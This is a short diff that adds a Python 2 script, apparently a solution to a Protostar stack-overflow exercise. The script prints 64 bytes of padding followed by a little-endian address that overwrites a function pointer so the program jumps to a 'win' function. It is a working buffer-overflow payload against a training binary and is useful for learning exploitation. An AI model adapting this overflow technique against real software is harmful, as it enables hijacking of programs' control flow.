@@ -1,0 +1,4 @@
+nop = "A"*64                    #padding of 64 bytes to reach the variable fp
+nop = nop+ "\x24\x84\x04\x08"   #fp is written with the address of win function (0X08048424)
+print nop                       #note protostar is little endian so put the address in reverse
+
